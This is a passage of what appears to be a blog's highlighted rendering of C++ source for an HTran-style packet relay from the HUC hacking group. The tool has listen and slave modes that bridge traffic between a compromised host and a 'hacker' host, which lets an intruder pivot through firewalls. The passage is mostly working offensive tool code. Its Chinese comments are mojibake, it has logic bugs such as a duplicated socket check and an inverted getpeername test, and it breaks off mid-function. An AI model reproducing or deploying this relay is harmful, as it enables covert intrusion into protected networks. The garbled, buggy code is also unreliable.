class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Usage   : E:\&gt;HTran</span></span><br><span class="line"><span class="comment">*       : ======================== HUC Packet Transmit Tool V1.00 =======================</span></span><br><span class="line"><span class="comment">*       : =========== Code by lion &amp; bkbll, Welcome to [url]http://www.cnhonker.com[/url] ==========</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [Usage of Packet Transmit:]</span></span><br><span class="line"><span class="comment">*       :  HTran -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [option:]</span></span><br><span class="line"><span class="comment">*       :  -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -tran  &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -slave  &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">************************************************************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®å®šä¹‰</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">SOCKETs1;</span><br><span class="line">SOCKETs2;</span><br><span class="line">&#125;Stu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°å£°æ˜</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>;<span class="comment">//å¯¹å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span>;<span class="comment">//ç›‘å¬åŠŸèƒ½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span>;<span class="comment">//ç»‘å®šsocketçš„åœ°å€ç»“æ„</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span>;<span class="comment">//æ•°æ®è½¬å‘å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span>;<span class="comment">//slaveå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span>;<span class="comment">//è¿æ¥æœåŠ¡ç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">version();</span><br><span class="line"><span class="comment">//å‚æ•°åˆ¤æ–­</span></span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">1</span>, <span class="number">1</span>), &amp;wsadata);</span><br><span class="line"><span class="keyword">char</span> hostIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> slaveIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">ret = param(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)<span class="comment">//Funlisten</span></span><br><span class="line">&#123;</span><br><span class="line">Funlisten(atoi(argv[<span class="number">2</span>]), atoi(argv[<span class="number">3</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(hostIp, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">strcpy</span>(slaveIp, argv[<span class="number">4</span>]);</span><br><span class="line">slave(argv[<span class="number">2</span>], argv[<span class="number">4</span>], atoi(argv[<span class="number">3</span>]), atoi(argv[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//stricmp==strcmp ignore caseå¿½ç•¥å¤§å°å†™</span></span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">4</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-listen&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;Funlisten&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">6</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-slave&quot;</span>) == <span class="number">0</span> &amp;&amp; checkIP(argv[<span class="number">2</span>]) &amp;&amp; checkIP(argv[<span class="number">4</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">version();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*listen åŠŸèƒ½æ¨¡å—*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»‘å®šç«¯å£åˆ°socketå¹¶ç›‘å¬</span></span><br><span class="line"><span class="keyword">if</span> (!bindAndFunlisten(sock1, port1) || !bindAndFunlisten(sock2, port2))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//éƒ½ç›‘å¬å¥½äº†æ¥ä¸‹æ¥â€¦â€¦</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> SizeOfAddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting for Client ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">sockaddr_inremoteSockAddr;</span><br><span class="line"><span class="comment">//sock1ç­‰å¾…è¿æ¥</span></span><br><span class="line">SOCKETrecvSock1 = accept(sock1, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port &quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting another Client on port:&quot;</span> &lt;&lt; port2 &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">SOCKETrecvSock2 = accept(sock2, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock2 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port&quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸¤ä¸ªéƒ½è¿ä¸Šæ¥äº†</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu_sock.s1 = recvSock1;stu_sock.s2 = recvSock2;</span><br><span class="line">DWORDdwThreadID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªè½¬å‘æ•°æ®çš„çº¿ç¨‹</span></span><br><span class="line">HANDLEhThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//çº¿ç¨‹é”™äº†ç›´æ¥é€€å‡º</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] CreateThread OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Sleep(<span class="number">800</span>);<span class="comment">//æŒ‚èµ·å½“å‰çº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//åœ°å€ç»“æ„</span></span><br><span class="line">sockaddr_inaddr;</span><br><span class="line"><span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">addr.sin_port = htons(port);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> on = <span class="number">1</span>;</span><br><span class="line">setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="keyword">sizeof</span>(on));</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»‘å®šåœ°å€ç»“æ„</span></span><br><span class="line"><span class="keyword">if</span> (bind(s, (<span class="keyword">const</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket bind error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç›‘å¬ç«¯å£</span></span><br><span class="line"><span class="keyword">if</span> (listen(s, <span class="number">5</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Listen error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> host_slave[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> host_hacker[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Stu_sock* stuSock = (Stu_sock*)data;</span><br><span class="line">SOCKETs1 = stuSock-&gt;s1;<span class="comment">//æ¥å—çš„æ˜¯slaveçš„æ•°æ®</span></span><br><span class="line">SOCKETs2 = stuSock-&gt;s2;<span class="comment">//å‘é€å‡ºå»çš„socket</span></span><br><span class="line"><span class="keyword">int</span>sentacount1 = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s1&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s2&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockaddr_inaddr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sizeofaddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getpeername(s1, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_slave, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_slave = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (getpeername(s2, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_hacker, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_hacker = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Start Transport (&quot;</span> &lt;&lt; host_slave &lt;&lt; <span class="string">&quot;&lt;-&gt; &quot;</span> &lt;&lt; host_hacker &lt;&lt; <span class="string">&quot;) ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">char</span> RecvBuffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">char</span> SendBuffer[<span class="number">20480</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd_setreadfd; fd_setwritefd;</span><br><span class="line">timevaltimeset;</span><br><span class="line">timeset.tv_sec = <span class="number">300</span>;</span><br><span class="line">timeset.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> maxfd = max(s1, s2) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> readsize;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readsize = <span class="number">0</span>;</span><br><span class="line">FD_ZERO(&amp;readfd);</span><br><span class="line">FD_ZERO(&amp;writefd);</span><br><span class="line">FD_SET((UINT)s1, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s2, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s1, &amp;writefd);</span><br><span class="line">FD_SET((UINT)s2, &amp;writefd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = select(maxfd, &amp;readfd, &amp;writefd, <span class="literal">NULL</span>, &amp;timeset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Select error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket time out.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ²¡å‡ºé”™ï¼Œæ²¡è¶…æ—¶</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;readfd) &amp;&amp; flag)<span class="comment">///////////////////////////////////1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//if (totalread1&lt;20408)</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s1, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//æ¥å—hostçš„è¯·æ±‚ã€‚ã€‚</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize == SOCKET_ERROR || readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; flag &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////2</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sendsize = send(s2, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//å‘ç»™slave</span></span><br><span class="line"><span class="keyword">if</span> (sendsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sendsize &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; sendsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s2, &amp;readfd) &amp;&amp; (!flag))<span class="comment">///////////////////////////////////3</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s2, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//æ¥å—slaveè¿”å›æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//totalread1+=readsize;</span></span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; (!flag) &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////4</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = send(s1, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//å‘ç»™host</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = !flag;</span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">closesocket(s1);</span><br><span class="line">closesocket(s2);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] OK! I Closed The Two Socket.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*slave åŠŸèƒ½æ¨¡å—*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//checkIP(hostIp);</span></span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line">fd_setfd;</span><br><span class="line"><span class="keyword">char</span>buffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">int</span>l;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket 